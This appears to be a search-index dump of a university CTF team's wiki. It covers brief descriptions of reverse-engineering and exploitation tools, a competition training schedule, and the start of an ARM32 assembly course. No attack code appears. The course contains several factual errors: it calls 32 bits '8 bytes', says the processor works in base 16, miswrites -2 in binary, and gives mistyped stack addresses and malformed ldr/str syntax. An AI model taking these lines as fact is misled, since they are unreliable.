debuggers","text":"<p>Learn more about WinDbg and other debuggers in Debugging Tools for Windows (WinDbg, KD, CDB, NTSD).</p>"},{"location":"Tool/PWN/WinHex/","title":"WinHex: Computer Forensics &amp; Data Recovery Software, Hex Editor &amp; Disk Editor","text":"<p>WinHex is in its core a universal hexadecimal editor, particularly helpful in the realm of computer forensics, data recovery, low-level data processing, and IT security. An advanced tool for everyday and emergency use: inspect and edit all kinds of files, recover deleted files or lost data from hard drives with corrupt file systems or from digital camera cards. Features depend on the license type (license type comparison), among them: </p> <ul> <li>Disk editor for hard disks, floppy disks, CD-ROM &amp; DVD, ZIP, Smart Media, Compact Flash, ...</li> <li>Native support for FAT12/16/32, exFAT, NTFS, Ext2/3/4, Next3\u00ae, CDFS, UDF</li> <li>Built-in interpretation of RAID systems and dynamic disks</li> <li>Various data recovery techniques</li> <li>RAM editor, providing access to physical RAM and other processes' virtual memory</li> <li>Data interpreter, knowing 20 data types</li> <li>Editing data structures using templates (e.g. to repair partition table/boot sector)</li> <li>Concatenating and splitting files, unifying and dividing odd and even bytes/words</li> <li>Analyzing and comparing files</li> <li>Particularly flexible search and replace functions</li> <li>Disk cloning (under DOS with X-Ways Replica)</li> <li>Drive images &amp; backups (optionally compressed or split into 650 MB archives)</li> <li>Programming interface (API) and scripting</li> <li>256-bit AES encryption, checksums, CRC32, hashes (MD5, SHA-1, ...)</li> <li>Erase (wipe) confidential files securely, hard drive cleansing to protect your privacy</li> <li>Import all clipboard formats, incl. ASCII hex values</li> <li>Convert between binary, hex ASCII, Intel Hex, and Motorola S</li> <li>Character sets: ANSI ASCII, IBM ASCII, EBCDIC, (Unicode)</li> <li>Instant window switching. Printing. Random-number generator.</li> <li>Supports files of any size. Very fast. Easy to use. Extensive program help.</li> <li>More</li> </ul> <p>Having all the bits and bytes in a computer at your fingertips has become a reality. Try before you buy. Computer forensics edition of WinHex with even more features: X-Ways Forensics.</p>"},{"location":"Tool/PWN/Zeratool/","title":"Zeratool","text":"<p>Automate exploit generate tool.</p>"},{"location":"Tool/PWN/Zeratool/#abstract","title":"Abstract","text":"<p>Automatic Exploit Generation (AEG) and remote flag capture for exploitable CTF problems</p> <p>This tool uses angr to concolically analyze binaries by hooking printf and looking for unconstrained paths. These program states are then weaponized for remote code execution through pwntools and a series of script tricks. Finally the payload is tested locally then submitted to a remote CTF server to recover the flag.</p>"},{"location":"Tool/PWN/Zeratool/#link","title":"Link","text":"<p>GitHub repo: https://github.com/ChrisTheCoolHut/Zeratool</p>"},{"location":"Tool/PWN/x64dbg/","title":"x64dbg","text":"<p>An open-source x64/x32 debugger for windows.</p> <p>Check out the blog!</p>"},{"location":"Tool/PWN/x64dbg/#features","title":"Features","text":"<ul> <li>Open-source</li> <li>Intuitive and familiar, yet new user interface</li> <li>C-like expression parser</li> <li>Full-featured debugging of DLL and EXE files (TitanEngine)</li> <li>IDA-like sidebar with jump arrows</li> <li>IDA-like instruction token highlighter (highlight registers, etc.)</li> <li>Memory map</li> <li>Symbol view</li> <li>Thread view</li> <li>Source code view</li> <li>Content-sensitive register view</li> <li>Fully customizable color scheme</li> <li>Dynamically recognize modules and strings</li> <li>Import reconstructor integrated (Scylla)</li> <li>Fast disassembler (Zydis)</li> <li>User database (JSON) for comments, labels, bookmarks, etc.</li> <li>Plugin support with growing API</li> <li>Extendable, debuggable scripting language for automation</li> <li>Multi-datatype memory dump</li> <li>Basic debug symbol (PDB) support</li> <li>Dynamic stack view</li> <li>Built-in assembler (XEDParse/asmjit)</li> <li>Executable patching</li> <li>Yara Pattern Matching</li> <li>Decompiler (Snowman)</li> <li>Analysis</li> </ul>"},{"location":"Tool/PWN/x64dbg/#wiki","title":"Wiki","text":"<p>https://github.com/x64dbg/x64dbg/wiki</p>"},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/","title":"Bytecode Viewer","text":"<p>Bytecode Viewer - a lightweight user-friendly Java/Android Bytecode Viewer, Decompiler &amp; More.</p>"},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/#new-features","title":"New Features","text":"<ul> <li>Dark mode with multiple themes</li> <li>Translated into over 30 languages including: Arabic, German, Japanese, Mandarin, Russian, Spanish</li> <li>Plugin Writer - create and edit external plugins from within BCV</li> <li>Fixed Java &amp; Bytecode editing/compiling</li> <li>Tabbed plugin console</li> <li>Right-click menus on the resource and search panels</li> <li>Javap disassembler</li> <li>XAPK support</li> <li>Updated nearly all dependencies (incl. decompilers like CFR, JD-GUI etc.)</li> <li>Updated ASM library to version 9.1</li> <li>Added support to Java files compiled using JDK &gt; 13</li> <li>Migrated to Maven</li> </ul>"},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/#screenshot","title":"Screenshot","text":""},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/#homepage","title":"Homepage","text":"<p>https://bytecodeviewer.com/</p> <p>https://github.com/Konloch/bytecode-viewer</p>"},{"location":"Tool/Reverse%20Engineering/DiE/","title":"Detect it Easy (DiE)","text":"<p>Detect It Easy, or abbreviated \"DIE\" is a program for determining types of files.</p> <p>\"DIE\" is a cross-platform application, apart from Windows version there are also available versions for Linux and Mac OS.</p> <p>Many programs of the kind (PEID, PE tools) allow to use third-party signatures. Unfortunately, those signatures scan only bytes by the pre-set mask, and it is not possible to specify additional parameters. As the result, false triggering often occur. More complicated algorithms are usually strictly set in the program itself. Hence, to add a new complex detect one needs to recompile the entire project. No one, except the authors themselves, can change the algorithm of a detect. As time passes, such programs lose relevance without the constant support.</p> <p>Detect It Easy has totally open architecture of signatures. You can easily add your own algorithms of detects or modify those that already exist. This is achieved by using scripts. The script language is very similar to JavaScript and any person, who understands the basics of programming, will understand easily how it works. Possibly, someone may decide the scripts are working very slow. Indeed, scripts run slower than compiled code, but, thanks to the good optimization of Script Engine, this doesn't cause any special inconvenience. The possibilities of open architecture compensate these limitations.</p> <p>DIE exists in three versions. Basic version (\"DIE\"), Lite version (\"DIEL\") and console version (\"DIEC\"). All the three use the same signatures, which are located in the folder \"db\". If you open this folder, nested sub-folders will be found (\"Binary\", \"PE\" and others). The names of sub-folders correspond to the types of files. First, DIE determines the type of file, and then sequentially loads all the signatures, which lie in the corresponding folder. Currently the program defines the following types:</p> <ul> <li>MSDOS executable files MS-DOS</li> <li>PE executable files Windows</li> <li>ELF executable files Linux</li> <li>MACH executable files Mac OS</li> <li>Binary all other files</li> </ul> <p>Download: https://github.com/horsicq/DIE-engine/releases</p> <p>Changelog: https://github.com/horsicq/Detect-It-Easy/blob/master/changelog.txt</p>"},{"location":"Tool/Reverse%20Engineering/DiE/#screenshot","title":"Screenshot","text":""},{"location":"Tool/Reverse%20Engineering/DiE/#homepage","title":"Homepage","text":"<p>https://github.com/horsicq/Detect-It-Easy</p>"},{"location":"Tool/Reverse%20Engineering/ExeInfoPE/","title":"ExeInfoPE","text":"<p>Packer, compressor detector / unpack info / internal exe tools</p> <p>Detect : Symbian / Android / Linux / Mac OS - files  </p> <p>PUP / PUA  Applications &amp; Downloaders</p> <p>Archives  :  .zip , .rar , .zlb , .gz , .7 zip , .tar , .cab .is , ...</p>"},{"location":"Tool/Reverse%20Engineering/ExeInfoPE/#screenshot","title":"Screenshot","text":""},{"location":"Tool/Reverse%20Engineering/ExeInfoPE/#homepage","title":"Homepage","text":"<p>http://exeinfo.booomhost.com/</p>"},{"location":"Tool/Reverse%20Engineering/IDA/","title":"IDA","text":"<p>The best-of-breed binary code analysis tool, an indispensable item in the toolbox of world-class software analysts, reverse engineers, malware analyst and cybersecurity professionals.</p>"},{"location":"Tool/Reverse%20Engineering/IDA/#a-powerful-disassembler-and-a-versatile-debugger","title":"A powerful disassembler and a versatile debugger","text":"<p>IDA Pro as a disassembler is capable of creating maps of their execution to show the binary instructions that are actually executed by the processor in a symbolic representation (assembly language). Advanced techniques have been implemented into IDA Pro so that it can generate assembly language source code from machine-executable code and make this complex code more human-readable.</p> <p>The debugging feature augmented IDA with the dynamic analysis. It supports multiple debugging targets and can handle remote applications. Its cross-platform debugging capability enables instant debugging, easy connection to both local and remote processes and support for 64-bit systems and new connection possibilities.</p> <p></p>"},{"location":"Training/Varsity%20Competition%20Training%20Model/","title":"Varsity Competition Training Model","text":""},{"location":"Training/Varsity%20Competition%20Training%20Model/#the-latest-training-schedule","title":"The Latest Training Schedule","text":"<p>View the training schedule on our wiki page: 2023 Spring Schedule.</p>"},{"location":"Training/Varsity%20Competition%20Training%20Model/#overview","title":"Overview","text":"<p>Varsity training is usually online + offline, usually at a fixed location and time. The goal of the training is to promote new members and to coach current varsity members to become proficient in a particular area. Training content may vary from school year to school year, depending on the schedule and staffing changes for that school year.</p>"},{"location":"Training/Varsity%20Competition%20Training%20Model/#training-format","title":"Training Format","text":"<p>The training format for Spring 2022 was influenced by COVID-19, which had been in an online self-study mode for a long time, and was partially adjusted when members returned to school.</p> <p>Training is usually held every Sunday morning and afternoon for separate objectives. The morning training is geared towards new members and is basic knowledge and practical training, while the afternoon is geared towards current varsity members and is advanced content and domain proficiency training.</p> <p>Adjustment Note: Most competitions will be held on Sundays, and the mindset on Sundays will also generally be better than on Saturdays, so it was adjusted to Sunday for offline training.</p> <p>Basic knowledge and practical training.</p> <p>The training is in the form of lecture + salon, which advocates communication during the training. The process will start with lecture sharing of training contents and providing reading materials. After the lecture, the materials will be read first, and the time will be rotated to summarize and conclude the content of the materials and share the materials they read to other members from the perspective of the pedagogue.</p> <p>Advanced content and domain proficiency training.</p> <p>The training is in the form of practice + salon. Before the training, the training questions will be collected and completed through the weekly question summary, and you need to complete the weekly question practice before the training. First, a summary of the solutions to the training questions and a lecture on the necessary knowledge will be conducted. For unintended solutions and multiple solutions, multiple solutions will also be used to share. The training time is then used to solve the questions on the spot, and after the solution, the member who completed the question will share in the salon.</p>"},{"location":"Training/Varsity%20Competition%20Training%20Model/#training-questions","title":"Training Questions","text":"<p>Each week's training will be followed by the release of the following week's practice questions, along with an open submission channel.</p> <p>The training questions will be selected from each field with some exercises with a difficulty gradient of.</p> <p>2 sign-ups + 2 normal + 1 difficult, with a total of 5 questions per domain.</p> <p>Members who choose multiple areas can choose any area to answer, and after completing this area, they can continue to complete other areas of questions.</p> <p>The areas that will be subject to topic selection are.</p> <p>Miscellaneous (Misc), Web (Web), Cryptography (Crypto), Binary (PWN), Reverse (RE).</p>"},{"location":"Training/Varsity%20Competition%20Training%20Model/#member-support","title":"Member Support","text":"<p>The training of the varsity team will also use the old-led model for mentoring and helping new members.</p> <p>Based on the collected directions of the current members of the varsity team, the current members of the varsity team who are responsible for mentoring the new members will be set.</p> <p>In the mentoring, the active members can recommend new members to join their own team based on their activity and knowledge base, and increase the matching score (20) in the team entry assessment.</p>"},{"location":"Training/Varsity%20Competition%20Training%20Model/#suggestions-feedback","title":"Suggestions Feedback","text":"<p>Any valuable suggestions on the training process can be sent to</p> <p>liz33#mail.sustech.edu.cn</p> <p>Valuable suggestions are also welcome.</p>"},{"location":"Training/Material/ARM32_1/","title":"ARM-32 Course 1","text":"<p>https://github.com/mytechnotalent/Reverse-Engineering</p> <p>by Kevin Thomas</p>"},{"location":"Training/Material/ARM32_1/#part-1-the-meaning-of-life","title":"Part 1 \u2013 The Meaning Of Life","text":"<p>\u201cSo if I go to college and learn Python or Java will I make a million dollars and have nice things?\u201d</p> <p>I felt it necessary to start out this tutorial series with such a statement. This is NOT an attack on Python or Java as in a prior life I worked with Java primarily in Android Development and currently use Python in my professional environment. In today\u2019s Agile environment, rapid-development is reality. With the increased challenges in both the commercial market and the government sector, software development will continue to focus on more robust libraries that will do more with less.</p> <p>As a Senior Software Engineer in Test, I try to help as many people as possible bridge their skill-set with either an entry-point or career advancement into the job market. One thing that is critical to understand is that there is and will continue to be a dramatic shortage of engineers and developers of all shapes and sizes.</p> <p>Like it or not, hardware is getting smaller and smaller and the trend is going from CISC to RISC. A CISC is your typical x86 computer with a complex series of instructions. CISC computers will always exist however with the trend going toward cloud computing and the fact that RISC machines with a reduced instruction set are so enormously powerful today, they are the obvious choice for consumption.</p> <p>How many cell phones do you think exist on earth today? Most of them are RISC machines. How many of you have a Smart TV or Amazon Echo or any number of devices considered part of the IoT or Internet Of Things? Each of these devices have one thing in common \u2013 they are RISC and all are primarily ARM based.</p> <p>ARM is an advanced RISC machine. Compared to the very complex architecture of a CISC, most ARM systems today are what is referred to as a SoC or system on chip which is an integrated circuit which has all of the components of a computer and electronic system on a single chip. This includes RF functionality as well. These low-power embedded devices can run versions of Windows, Linux and many other advanced operating systems.</p> <p>\u201cWell who cares about ARM, you can call it anything you want, I know Python or Java and that\u2019s all I need to know cause when I program it works everywhere so I don\u2019t have to worry about anything under the hood.\u201d</p> <p>I again just want you to reflect on the above statement for a brief moment. As every day continues to pass, more and more systems are becoming vulnerable to attack and compromise. Taking the time to understand what is going on under the hood can only help to curb this unfortunate reality.</p> <p>This series will focus on ARM Assembly. We will work with a Raspberry Pi 3 which contains the Broadcom BCM2837 SoC with a 4x ARM Cortex-A53, 1.2GHz CPU and 1 GB LPDDR2 RAM. We will work with the Raspbian Jessie, Linux-based operating system. If you don\u2019t own a Raspberry Pi 3, they are usually available for $35 on Amazon or any number of retailers. If you would like to learn more visit https://www.raspberrypi.org.</p> <p>We will work solely in the terminal so no pretty pictures and graphics as we are keeping it to the hardcore bare-bones utilizing the GNU toolkit to compile and debug our code base.</p> <p>UNDER NO CONDITIONS ARE YOU TO EVER USE THIS EDUCATION TO CAUSE HARM TO ANY SYSTEM OF ANY KIND AS I AM NOT RESPONSIBLE! THIS IS FOR LEARNING PURPOSES ONLY!</p>"},{"location":"Training/Material/ARM32_1/#part-2-number-systems","title":"Part 2 \u2013 Number Systems","text":"<p>At the core of the microprocessor are a series of binary numbers which are either +5V (on or 1) or 0V (off or 0). Each 0 or 1 represents a bit of information within the microprocessor. A combination of 8 bits results in a single byte.</p> <p>Before we dive into binary, lets examine the familiar decimal. If we take the number 2017, we would understand this to be two thousand and seventeen.</p> <pre><code>Value          1000s    100s    10s    1s\n\nRepresentation 10^3     10^2    10^1   10^0\n\nDigit          2        0       1      7\n</code></pre> <p>Let\u2019s take a look at the binary system and the basics of how it operates.</p> <pre><code>Bit Number     b7    b6    b5    b4    b3    b2    b1    b0\n\nRepresentation 2^7   2^6   2^5   2^4   2^3   2^2   2^1   2^0\n\nDecimal Weight 128   64    32    16    8     4     2     1\n</code></pre> <p>If we were to convert a binary number into decimal, we would very simply do the following. Lets take a binary number of 0101 1101 and as you can see it is 93 decimal.</p> <pre><code>Bit    Weight    Value\n\n0      128       0\n\n1      64        64\n\n0      32        0\n\n1      16        16\n\n1      8         8\n\n1      4         4\n\n0      2         0\n\n1      1         1\n</code></pre> <p>Adding the values in the value column gives us 0 + 64 + 0 + 16 + 8 + 4 + 0 + 1 = 93 decimal.</p> <p>If we were to convert a decimal number into binary, we would check to see if a subtraction is possible relative to the highest order bit and if so, a 1 would be placed into the binary column to which the remainder would be carried into the next row. Let\u2019s consider the example of the decimal value of 120 which is 0111 1000 binary.</p> <pre><code>128    64    32    16    8    4    2    1\n\n0      1     1     1     1    0    0    0\n</code></pre> <p>1)Can 128 fit inside of 120: No, therefore 0.</p> <p>2)Can 64 fit inside of 120: Yes, therefore 1, then 120 \u2013 64 = 56.</p> <p>3)Can 32 fit inside of 56: Yes, therefore 1, then 56 \u2013 32 = 24.</p> <p>4)Can 16 fit inside of 24: Yes, therefore 1, then 24 \u2013 16 = 8.</p> <p>5)Can 8 fit inside of 8: Yes, therefore 1, then 8 \u2013 8 = 0.</p> <p>6)Can 4 fit inside of 0: No, therefore 0.</p> <p>7)Can 2 fit inside of 0: No, therefore 0.</p> <p>8)Can 1 fit inside of 0: No, therefore 0.</p> <p>When we want to convert binary to hex we simply work with the following table.</p> <pre><code>Decimal    Hex    Binary\n\n0          0      0000\n\n1          1      0001\n\n2          2      0010\n\n3          3      0011\n\n4          4      0100\n\n5          5      0101\n\n6          6      0110\n\n7          7      0111\n\n8          8      1000\n\n9          9      1001\n\n10         A      1010\n\n11         B      1011\n\n12         C      1100\n\n13         D      1101\n\n14         E      1110\n\n15         F      1111\n</code></pre> <p>Lets convert a binary number such as 0101 1111 to hex. To do this we very simply look at the table and compare each nibble which is a combination of 4 bits. Keep in mind, 8 bits is equal to a byte and 2 nibbles are equal to a byte.</p> <pre><code>0101 = 5\n\n1111 = F\n</code></pre> <p>Therefore 0101 1111 binary = 0x5f hex. The 0x notation denotes hex.</p> <p>To go from hex to binary it\u2019s very simple as you have to simply do the opposite such as:</p> <pre><code>0x3a = 0011 1010\n\n\n3 = 0011\n\nA = 1010\n</code></pre> <p>It is important to understand that each hex digit is a nibble in length therefore two hex digits are a byte in length.</p> <p>To convert from hex to decimal we do the following:</p> <pre><code>0x5f = 95\n\n\n5 = 5 x 16^1 = 5 x 16 = 80\n\nF = 15 x 16^0 = 15 x 1 = 15\n</code></pre> <p>Therefore we can see that 80 + 15 = 95 which is 0x5f hex.</p> <p>Finally to convert from decimal to hex. Lets take the number 850 decimal which is 352 hex.</p> <pre><code>Division Result(No Remainder) Remainder Remainder Multiplication\n\n850 / 16 53                   0.125     0.125 x 16 = 2\n\n53 / 16  3                    0.3125    0.3125 x 16 = 5\n\n3 / 16   0                    0.1875    0.1875 x 16 = 3\n</code></pre> <p>We put the numbers together from bottom to the top and we get 352 hex.</p> <p>\u201cWhy the hell would I waste my time learning all this crap when the computer does all this for me!\u201d</p> <p>If you happen to know any reverse engineers please if you would take a moment and ask them the above question.</p> <p>The reality is, if you do NOT have a very firm understanding of how all of the above works, you will NEVER get a grasp on how the ARM processor registers hold and manipulate data. You will NEVER get a grasp on how the ARM processor deals with a binary overflow and it\u2019s effect on how carry operations work nor will you understand how compare operations work or even the most basic operations of the most simple assembly code.</p> <p>I am not suggesting you memorize the above, nor am I suggesting that you do a thousand examples of each. All I ask is that you take the time to really understand that literally everything and I mean everything goes down to binary bits in the processor.</p> <p>Whether you are creating, debugging or hacking an Assembly, Python, Java, C, C++, R, JavaScript, or any other new language application that hits the street, ultimately everything MUST go down to binary 0 and 1 to which represent a +5V or 0V.</p> <p>We as humans operate on the base 10 decimal system. The processor works on a base 16 (hex) system. The registers we are dealing with in conjunction with Linux are addressed in 32-bit sizes. When we begin discussion of the processor registers, we will learn that each are 32-bits wide (technically the BCM2837 are 64-bit wide however our version of Linux that we are working with is 32-bit therefore we only address 32-bits of each register).</p>"},{"location":"Training/Material/ARM32_1/#part-3-binary-addition","title":"Part 3 \u2013 Binary Addition","text":"<p>Binary addition can occur in one of four different fashions:</p> <pre><code>0 + 0 = 0\n\n1 + 0 = 1\n\n0 + 1 = 1\n\n1 + 1 = 0 (1) [One Plus One Equals Zero, Carry One]\n</code></pre> <p>Keep in mind the (1) means a carry bit. It very simply means an overflow.</p> <p>Lets take the following 4-bit nibble example:</p> <pre><code>  0111\n\n+ 0100\n\n= 1011\n</code></pre> <p>We see an obvious carry in the 3rd bit. If the 8th bit had a carry then this would generate a carry flag within the CPU.</p> <p>Let\u2019s examine an 8-bit number:</p> <pre><code>  01110000\n\n+ 01010101\n\n= 11000101\n</code></pre> <p>If we had:</p> <pre><code>     11110000\n\n+    11010101\n\n= (1)11000101\n</code></pre> <p>Here we see a carry bit which would trigger the carry flag within the CPU to be 1 or true. We will discuss the carry flag in later tutorials. Please just keep in mind this example to reference as it is very important to understand.</p>"},{"location":"Training/Material/ARM32_1/#part-4-binary-subtraction","title":"Part 4 \u2013 Binary Subtraction","text":"<p>Binary subtraction is nothing more than adding the negative value of the number to be subtracted. For example 8 + - 4, the starting point would be zero to which we move 8 points in the positive direction and then four points in the negative direction yielding a value of 4.</p> <p>We represent a sign bit in binary to which bit 7 indicates the sign of number where 0 is positive and 1 is negative.</p> <pre><code>Sign Bit 7     Bits 0 \u2013 6\n\n1              0000011\n</code></pre> <p>The above would represent -2.</p> <p>We utilize the concept of twos compliment which inverts each bit and then finally adding 1.</p> <p>Lets example binary 2.</p> <pre><code>00000010\n</code></pre> <p>Invert the bits.</p> <pre><code>11111101\n</code></pre> <p>Add 1.</p> <pre><code>  11111101\n\n+ 00000001\n\n  11111110\n</code></pre> <p>Let\u2019s examine a subtraction operation:</p> <pre><code>   00000100  4 decimal\n\n + 11111110 -2 decimal\n\n(1)00000010  2 decimal\n</code></pre> <p>So what is the (1) you may ask, that is the overflow bit. In future tutorials we will examine what we refer to as the overflow flag and carry flag.</p>"},{"location":"Training/Material/ARM32_1/#part-5-word-lengths","title":"Part 5 \u2013 Word Lengths","text":"<p>The system on chip we are working with has a 32-bit ARM CPU. 32-bits is actually 4 bytes of information which make up a word.</p> <p>If you remember my prior tutorial on x86 Assembly, a word was 16-bits. Every different architecture defines a word differently.</p> <p>The most significant bit of a word for our ARM CPU is located at bit 31 therefore a carry is generated if an overflow occurs there.</p> <p>The lowest address in our architecture starts at 0x00000000 and goes to 0xFFFFFFFF. The processor sees memory in word blocks therefore every 4 bytes. A memory address associated with the start of a word is referred to as a word boundary and is divisible by 4. For example here is our first word:</p> <pre><code>0x00000000\n\n0x00000004\n\n0x00000008\n\n0x0000000C\n</code></pre> <p>So why is this important? There is the concept of fetching and executing to which the processor deals with instructions to which it must work in this fashion for proper execution.</p> <p>Before we dive into coding assembly it is critical that you understand some basics of how the CPU operates. There will be a number of more lectures going over the framework so I appreciate everyone hanging in there!</p>"},{"location":"Training/Material/ARM32_1/#part-6-registers","title":"Part 6 \u2013 Registers","text":"<p>Our ARM microprocessor has internal storage which make any operation must faster as there is no external memory access needed. There are two modes, User and Thumb. We will be focusing on User Mode as we are ultimately focused on developing for a system on chip within a Linux OS rather than bare-metal programming which would be better suited on a microcontroller device.</p> <p>In User Mode we have 16 registers and a CPSR register to which have a word length each which is 32-bits each or 8 bytes each.</p> <p>Registers R0 to R12 are multi-purpose registers to which R13 \u2013 R15 have a unique purpose as well as the CPSR. Lets take a look at a simple table to illustrate.</p> <pre><code>R0 GPR (General-Purpose Register)\n\nR1 GPR (General-Purpose Register)\n\nR2 GPR (General-Purpose Register)\n\nR3 GPR (General-Purpose Register)\n\nR4 GPR (General-Purpose Register)\n\nR5 GPR (General-Purpose Register)\n\nR6 GPR (General-Purpose Register)\n\nR7 GPR (General-Purpose Register)\n\nR8 GPR (General-Purpose Register)\n\nR9 GPR (General-Purpose Register)\n\nR10 GPR (General-Purpose Register)\n\nR11 GPR (General-Purpose Register)\n\nR12 GPR (General-Purpose Register)\n\nR13 Stack Pointer\n\nR14 Link Register\n\nR15 Program Counter\n\nCPSR Current Program Status Register\n</code></pre> <p>It is critical that we understand registers in a very detailed way. At this point we understand R0 \u2013 R12 are general purpose and will be used to manipulate data as we build our programs and additionally when you are hacking apart or reverse engineering binaries from a hex dump on a cell phone or other ARM device, no matter what high-level language it is written in, it must ultimately come down to assembly which you need to understand registers and how they work to grasp and understand of any such aforementioned operation.</p> <p>The chip we are working with is known as a load and store machine. This means we load a register with the contents of a register or memory location and we can store a register with the contents of a memory or register location. For example:</p> <pre><code>ldr, r4, [r10] @ \n    load r4 with the contents of r10, if r10 had the decimal value of \n    say 22, 22 would go to r4\n\nstr, r9, [r4] @ \n    store r9 contents into location in r4, if r9 had 0x02 hex, \n    0x02 would be stored into location r4\n</code></pre> <p>The @ simply indicates to the compiler that what follows it on a given line is a comment and to be ignored.</p> <p>The next few weeks we will take our time and look at each of the special purpose registers so you have a great understanding of what they do.</p>"},{"location":"Training/Material/ARM32_1/#part-7-program-counter","title":"Part 7 - Program Counter","text":"<p>We will dive into the registers over the coming weeks to make sure you obtain a firm understand of their role and what they can do.</p> <p>We begin with the PC or program counter. The program counter is responsible for directing the CPU to what instruction will be executed next. The PC literally holds the address of the instruction to be fetched next.</p> <p>When coding you can refer to the PC as PC or R15 as register 15 is the program counter. You MUST treat it with care as you can set it wrong and crash the executable quite easily.</p> <p>You can control the PC directly in code:</p> <p><code>mov r15, 0x00000000</code></p> <p>I would not suggest trying that as we are not in Thumb mode and that will cause a fault as you would be going to an OS area rather than designated program area.</p> <p>Regarding our ARM processor, we follow the standard calling convention meaning params are passed by placing the param values into regs R0 \u2013 R3 before calling the subroutine and the subroutine returns a value by putting it in R0 before returning.</p> <p>This is important to understand when we think about how execution flows when dealing with a stack operation and the link register which we will discuss in future tutorials.</p> <p>When you are hacking or reversing a binary, controlling the PC is essential when you want to test for subroutine execution and learning about how the program flows in order to break it down and understand exactly what it is doing.</p>"},{"location":"Training/Material/ARM32_1/#part-8-cpsr","title":"Part 8 - CPSR","text":"<p>The CPSR register stores info about the program and the results of a particular operation. Bits that are in the respective registers have pre-assigned conditions that are tested for an occurrence which are flags.</p> <p>There are 32-bits that total this register. The highest 4 we are concerned with most which are:</p> <p>Bit 31 \u2013 N = Negative Flag</p> <p>Bit 30 \u2013 Z = Zero Flag</p> <p>Bit 29 \u2013 C = Carry Flag (UNSIGNED OPERATIONS)</p> <p>Bit 28 \u2013 V = Overflow flag (SIGNED OPERATIONS)</p> <p>When the instruction completes the CPSR can get updated if it falls into one of the aforementioned scenarios. If one of the conditions occurs, a 1 goes into the respective bits.</p> <p>There are two instructions that directly effect the CPSR flags which are CMP and CMN. CMP is compare such as:</p> <p>CMP R1, R0 @notational subtraction where R1 \u2013 R0 and if the result is 0, bit 30 Z would be set to 1</p> <p>The most logical command that usually follows is BEQ = branch if equal, meaning the zero flag was set and branches to another label within the code.</p> <p>Regarding CMP, if two operands are equal then the result is zero. CMN makes the same comparison but with the second operand negated for example:</p> <p>CMN R1, R0 @ R1 - (-R0) or R1 + R0</p> <p>When dealing with the SUB command, the result would NOT update the CPSR you would have to use the SUBS command to make any flag update respectively.</p>"},{"location":"Training/Material/ARM32_1/#part-9-link-register","title":"Part 9 \u2013 Link Register","text":"<p>The Link Register, R14, is used to hold the return address of a function call.</p> <p>When a BL (branch with link) instruction performs a subroutine call, the link register is set to the subroutine return address. BL jumps to another location in the code and when complete allows a return to the point right after the BL code section. When the subroutine returns, the link register returns the address back to the program counter.</p> <p>The link register does not require the writes and reads of the memory containing the stack which can save a considerable percentage of execution time with repeated calls of small subroutines.</p> <p>When BL has executed, the return address which is the address of the next instruction to be executed, is loaded into the LR or R14. When the subroutine has finished, the LR is copied directly to the PC (Program Counter) or R15 and code execution continues where it was prior in the sequential code source.</p> <p>CODE TIME! Don\u2019t be discouraged if you don\u2019t understand everything in the code example here. It will become clear over the next few lessons.</p> <p></p> <p>To compile:</p> <pre><code>as -o lr_demo.o lr_demo.s\nld -o lr_demo lr_demo.o\n</code></pre> <p>The simple example I created here is pretty self-explanatory. We start and proceed to the no_return subroutine and proceed to the my_function subroutine then to the wrap_up subroutine and finally exit.</p> <p>It is necessary that we jump into GDB which is our debugger to see exactly what happens with each step:</p> <p></p> <p>As you can see with every step inside the debugger it shows you exactly the progression from no_return to my_function skipping wrap_up until the program counter gets the address from the link register.</p> <p></p> <p>Here we see the progression from wrap_up to exit.</p> <p>This is a fundamental operation when we see next week how the stack operates as the LR is an essential part of this process.</p>"},{"location":"Training/Material/ARM32_1/#part-10-stack-pointer","title":"Part 10 \u2013 Stack Pointer","text":"<p>The Stack is an abstract data type to which is a LIFO (Last In First Out). When we push a value onto the stack it goes into the Stack Pointer and when it is popped off of the stack it pops the value off of the stack and into a register of your choosing.</p> <p>CODE TIME! Again, don\u2019t be discouraged if you don\u2019t understand everything in the code example here. It will become clear over the next few lessons.</p> <p></p> <p>To compile:</p> <pre><code>as -o sp_demo.o sp_demo.s\nld -o sp_demo sp_demo.o\n</code></pre> <p>Once again lets load the binary into GDB to see what is happening.</p> <p></p> <p>Lets step into one time.</p> <p></p> <p>We see hex 30 or 48 decimal moved into r7. Lets step into again.</p> <p></p> <p>We see the value of the sp change from 0x7efff3a0 to 0xefff39c. That is a movement backward 4 bytes. Why the heck is the stack pointer going backward you may ask!</p> <p>The answer revolves around the fact that the stack grows DOWNWARD. When we say the top of the stack you can imagine a series of plates being placed BENEATH of each other.</p> <p>Originally the sp was at 0x7efff3a0.</p> <p></p> <p>When we pushed r7 onto the stack, the new value of the Stack Pointer is now 0x7efff39c so we can see the Stack truly grows DOWNWARD in memory.</p> <p></p> <p>Now lets step into again.</p> <p></p> <p>We can see the value of hex 10 or decimal 16 moved into r7. Notice the sp did not change.</p> <p>Before we step into again, lets look at the value inside the sp.</p> <p></p> <p>Lets step into again.</p> <p></p> <p>We see the value in the stack was popped off the stack and put back into r7 therefore the value of hex 30 is back in r7 as well as the sp is back at 0x73fff3a0.</p> <p></p> <p>Please take the time to type out the code, compile and link it and then step through the binary in GDB. Stack operations are critical to understanding Reverse Engineering and Malware Analysis as well as any debugging of any kind.</p>"},{"location":"Training/Material/ARM32_1/#part-11-arm-firmware-boot-procedures","title":"Part 11 - ARM Firmware Boot Procedures","text":"<p>Let\u2019s take a moment to talk about what happens when we first power on our Raspberry Pi device.</p> <p>As soon as the Pi receives power, the graphics processor is the first thing to run as the processor is held in a reset state to which the GPU starts executing code. The ROM reads from the SD card and reads bootcode.bin to which gets loaded into memory in C2 cache and turns on the rest of the RAM to which start.elf then loads.</p> <p>The start.elf is an OS for the graphics processor and reads config.txt to which you can mod. The kernel.img then gets loaded into 0x8000 in memory which is the Linux kernel.</p> <p>Once loaded, kernel.img turns on the CPU and starts running at 0x8000 in memory.</p> <p>If we wanted, we could create our own kernel.img to which we can hard code machine code into a file and replace the original image and then reboot. Keep in mind the ARM word size is 32 bit long which go from bit 0 to 31.</p> <p>As stated, when kernel.img is loaded the first byte, which is 8-bits, is loaded into address 0x8000.</p> <p>Lets open up a hex editor and write the following:</p> <p>FE FF FF EA</p> <p>Save the file as kernel.img and reboot.</p> <p>\u201cOk nothing happens, this sucks!\u201d</p> <p>Actually something did happen, you created your first bare-metal firmware! Time to break out the champagne!</p> 